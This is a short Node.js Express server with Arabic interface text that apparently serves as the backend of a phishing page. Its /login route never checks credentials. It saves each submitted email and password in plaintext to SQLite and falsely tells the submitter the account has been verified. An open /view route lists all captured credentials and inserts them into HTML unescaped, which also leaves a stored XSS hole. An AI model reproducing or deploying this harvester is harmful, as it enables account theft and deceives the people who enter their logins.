const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

const db = new sqlite3.Database('users.db');

db.run(`CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT,
    password TEXT
)`);

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/login', (req, res) => {
    const email = req.body.email;
    const password = req.body.password;

    db.run("INSERT INTO users (email, password) VALUES (?, ?)", [email, password]);

    res.send(`
        <h2 style="text-align:center;color:green;margin-top:100px;">تم التحقق من صحة حسابك</h2>
        <p style="text-align:center;">البيانات حفظت على السيرفر!</p>
        <a href="/" style="display:block;text-align:center;margin-top:20px;color:blue;">رجوع</a>
        <a href="/view" style="display:block;text-align:center;margin-top:10px;color:blue;">عرض البيانات</a>
    `);
});

app.get('/view', (req, res) => {
    db.all("SELECT * FROM users", (err, rows) => {
        let html = '<h2 style="text-align:center;">البيانات المحفوظة:</h2><ul style="direction:rtl;padding-right:40px;">';
        if (rows.length === 0) html += '<li>لا توجد بيانات</li>';
        rows.forEach(row => {
            html += `<li>الإيميل: ${row.email} | كلمة المرور: ${row.password}</li>`;
        });
        html += '</ul><a href="/" style="display:block;text-align:center;color:blue;">رجوع</a>';
        res.send(html);
    });
});

const port = process.env.PORT || 3000;
app.listen(port, () => console.log('السيرفر شغال'));
